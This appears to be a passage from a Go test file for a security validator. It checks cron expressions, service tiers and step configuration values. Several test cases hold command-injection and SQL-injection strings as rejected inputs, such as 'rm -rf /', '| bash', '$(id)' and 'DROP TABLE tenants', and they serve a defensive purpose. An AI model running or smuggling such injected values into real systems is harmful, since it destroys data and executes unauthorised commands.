	// Because the TTL starts at zero (capabilitiesLoaded is zero time),
	// the first call to getCapabilities sees a stale cache and launches a
	// refresh goroutine. We call it twice to give the goroutine a chance to run.
	_ = sv.GetAllowedCapabilities()
	_ = sv.GetAllowedCapabilities()

	// The background goroutine ran synchronously in test (mock is instant).
	// Verify defaults are still present (DB caps may or may not be merged yet).
	caps := sv.GetAllowedCapabilities()
	if len(caps) == 0 {
		t.Fatal("expected non-empty capability list")
	}
}

// =============================================================================
// Tests: ValidateCronExpression
// =============================================================================

func TestSecValValidateCronExpression_ValidFiveField(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	validExprs := []string{
		"* * * * *",
		"0 * * * *",
		"0 0 * * *",
		"0 0 1 * *",
		"0 0 1 1 *",
		"30 4 1,15 * 5",
		"*/15 * * * *",
		"0 9-17 * * 1-5",
	}

	for _, expr := range validExprs {
		t.Run(expr, func(t *testing.T) {
			err := sv.ValidateCronExpression(expr)
			if err != nil {
				t.Errorf("expected %q to be valid, got error: %v", expr, err)
			}
		})
	}
}

func TestSecValValidateCronExpression_ValidSixField(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	// 6-field (with seconds)
	err := sv.ValidateCronExpression("0 30 9 * * 1-5")
	if err != nil {
		t.Errorf("expected 6-field cron to be valid, got: %v", err)
	}
}

func TestSecValValidateCronExpression_EmptyString_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	err := sv.ValidateCronExpression("")
	if err != nil {
		t.Errorf("expected empty cron expression to be valid, got: %v", err)
	}
}

func TestSecValValidateCronExpression_TooFewFields(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	err := sv.ValidateCronExpression("* * * *") // 4 fields only
	if err == nil {
		t.Fatal("expected error for cron with < 5 fields")
	}
}

func TestSecValValidateCronExpression_TooManyFields(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	err := sv.ValidateCronExpression("* * * * * * *") // 7 fields
	if err == nil {
		t.Fatal("expected error for cron with > 6 fields")
	}
}

func TestSecValValidateCronExpression_InvalidCharsInField(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	invalidExprs := []string{
		"a * * * *",          // letters in minute field
		"0 b * * *",          // letters in hour field
		"0 0 c * *",          // letters in day field
	}

	for _, expr := range invalidExprs {
		t.Run(expr, func(t *testing.T) {
			err := sv.ValidateCronExpression(expr)
			if err == nil {
				t.Errorf("expected error for cron %q with invalid chars", expr)
			}
		})
	}
}

func TestSecValValidateCronExpression_InjectionPatterns(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	// Expressions with shell metacharacters that should be rejected
	dangerous := []string{
		"* * * * *; rm -rf /",
		"* * * * * | bash",
		"$(id) * * * *",
		"* * * * * `id`",
	}

	for _, expr := range dangerous {
		t.Run(expr, func(t *testing.T) {
			err := sv.ValidateCronExpression(expr)
			if err == nil {
				t.Errorf("expected error for dangerous cron expression %q", expr)
			}
		})
	}
}

// =============================================================================
// Tests: ValidateTier
// =============================================================================

func TestSecValValidateTier_ValidTiers(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	for _, tier := range []string{"shared", "dedicated", "premium"} {
		t.Run(tier, func(t *testing.T) {
			err := sv.ValidateTier(tier)
			if err != nil {
				t.Errorf("expected %q to be valid, got: %v", tier, err)
			}
		})
	}
}

func TestSecValValidateTier_CaseInsensitive(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	variants := []string{"SHARED", "Dedicated", "PREMIUM", "Shared"}
	for _, tier := range variants {
		t.Run(tier, func(t *testing.T) {
			err := sv.ValidateTier(tier)
			if err != nil {
				t.Errorf("expected %q to be valid (case-insensitive), got: %v", tier, err)
			}
		})
	}
}

func TestSecValValidateTier_EmptyString_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	err := sv.ValidateTier("")
	if err != nil {
		t.Errorf("expected empty tier to be valid (defaults to shared), got: %v", err)
	}
}

func TestSecValValidateTier_InvalidTier(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	invalidTiers := []string{
		"free",
		"enterprise",
		"gold",
		"silver",
		"basic",
		"unknown",
		"shared; DROP TABLE tenants",
	}

	for _, tier := range invalidTiers {
		t.Run(tier, func(t *testing.T) {
			err := sv.ValidateTier(tier)
			if err == nil {
				t.Errorf("expected error for invalid tier %q", tier)
			}
		})
	}
}

// =============================================================================
// Tests: ValidateTierWithResult
// =============================================================================

func TestSecValValidateTierWithResult_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateTierWithResult("shared", "tier")

	if !result.Valid {
		t.Fatalf("expected valid tier result, got %v", result.Errors)
	}
}

func TestSecValValidateTierWithResult_Invalid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateTierWithResult("platinum", "tier")

	if result.Valid {
		t.Fatal("expected invalid tier result")
	}
	if !hasCode(result, "INVALID_TIER") {
		t.Errorf("expected INVALID_TIER error, got %v", result.Errors)
	}
}

func TestSecValValidateTierWithResult_FieldNameInError(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	result := sv.ValidateTierWithResult("bad-tier", "agent_tier")

	if result.Valid {
		t.Fatal("expected invalid")
	}
	if len(result.Errors) == 0 {
		t.Fatal("expected at least one error")
	}
	if result.Errors[0].Field != "agent_tier" {
		t.Errorf("expected field 'agent_tier', got %q", result.Errors[0].Field)
	}
}

// =============================================================================
// Tests: SanitizeTier (package-level function)
// =============================================================================

func TestSecValSanitizeTier_ValidTier(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"shared", "shared"},
		{"dedicated", "dedicated"},
		{"premium", "premium"},
		{"SHARED", "shared"},
		{"Dedicated", "dedicated"},
		{"PREMIUM", "premium"},
	}

	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			got := app.SanitizeTier(tc.input)
			if got != tc.expected {
				t.Errorf("SanitizeTier(%q) = %q, want %q", tc.input, got, tc.expected)
			}
		})
	}
}

func TestSecValSanitizeTier_EmptyString_DefaultsToShared(t *testing.T) {
	got := app.SanitizeTier("")
	if got != "shared" {
		t.Errorf("expected 'shared' for empty input, got %q", got)
	}
}

func TestSecValSanitizeTier_InvalidTier_DefaultsToShared(t *testing.T) {
	invalidTiers := []string{"enterprise", "free", "gold", "unknown", "  "}

	for _, tier := range invalidTiers {
		t.Run(tier, func(t *testing.T) {
			got := app.SanitizeTier(tier)
			if got != "shared" {
				t.Errorf("SanitizeTier(%q) = %q, want 'shared'", tier, got)
			}
		})
	}
}

func TestSecValSanitizeTier_StripsWhitespace(t *testing.T) {
	// Whitespace-only → not a valid tier → "shared"
	got := app.SanitizeTier("  ")
	if got != "shared" {
		t.Errorf("expected 'shared' for whitespace input, got %q", got)
	}
}

// =============================================================================
// Tests: checkValueRecursive (JSON RawMessage handling)
// =============================================================================

func TestSecValValidateStepConfig_JSONRawMessageValue(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	// A JSON raw message containing an injection pattern
	raw := json.RawMessage(`"$(id)"`)
	config := map[string]any{
		"data": raw,
	}

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		nil,
		config,
	)

	if result.Valid {
		t.Fatal("expected invalid result for injection in JSON RawMessage value")
	}
	if !hasCode(result, "DANGEROUS_CONFIG_VALUE") {
		t.Errorf("expected DANGEROUS_CONFIG_VALUE, got %v", result.Errors)
	}
}

func TestSecValValidateStepConfig_JSONRawMessageSafeValue(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	raw := json.RawMessage(`"safe-value"`)
	config := map[string]any{
		"data": raw,
	}

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		nil,
		config,
	)

	if !result.Valid {
		t.Fatalf("expected valid result for safe JSON RawMessage, got %v", result.Errors)
	}
}

// =============================================================================
// Tests: ValidationResult struct
// =============================================================================

func TestSecValValidationResult_MultipleErrors_AllReported(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	// Missing fields + dangerous config in the same payload → multiple errors
	payload := map[string]any{
		// all required fields missing
		"step_config": map[string]any{
			"bash": "evil $(id)",
		},
	}

	result := sv.ValidateCommandPayload(context.Background(), shared.NewID(), payload)

	if result.Valid {
		t.Fatal("expected invalid")
	}

	if len(result.Errors) < 2 {
		t.Errorf("expected multiple errors, got %d: %v", len(result.Errors), result.Errors)
	}
}

// =============================================================================
// Tests: ValidTiers exported variable
// =============================================================================

func TestSecValValidTiers_ContainsExpectedValues(t *testing.T) {
	expected := map[string]bool{
		"shared":    true,
		"dedicated": true,
		"premium":   true,
	}

	if len(app.ValidTiers) != len(expected) {
		t.Errorf("expected %d valid tiers, got %d: %v", len(expected), len(app.ValidTiers), app.ValidTiers)
	}

	for _, tier := range app.ValidTiers {
		if !expected[tier] {
			t.Errorf("unexpected tier %q in ValidTiers", tier)
		}
	}
}

// =============================================================================
// Tests: Edge cases — non-string types in config values should not error
// =============================================================================

func TestSecValValidateStepConfig_NumericAndBoolValues_Valid(t *testing.T) {
	repo := newSecValMockToolRepo()
	sv := newSecValValidator(repo)

	config := map[string]any{
		"timeout":  30,
		"verbose":  true,
		"max_rate": 100.5,
	}

	result := sv.ValidateStepConfig(
		context.Background(),
		shared.NewID(),
		"",
		nil,
		config,
	)

	if !result.Valid {
		t.Fatalf("expected valid for numeric/bool config values, got %v", result.Errors)
	}
}

// =============================================================================
// Tests: getCapabilities refreshes on stale cache
// =============================================================================

func TestSecValGetAllowedCapabilities_DBErrorFallsBackToDefaults(t *testing.T) {
	repo := newSecValMockToolRepo()
	repo.capsErr = errors.New("db connection failed")
	sv := newSecValValidator(repo)

	caps := sv.GetAllowedCapabilities()

	// Should still return defaults even if DB is unavailable
	if len(caps) == 0 {
		t.Fatal("expected non-empty capabilities (defaults) when DB fails")
	}

	// Core defaults should be present
	capSet := make(map[string]bool, len(caps))
	for _, c := range caps {
		capSet[c] = true
	}
	if !capSet["scan"] {
		t.Error("expected default capability 'scan' even when DB fails")
	}
}
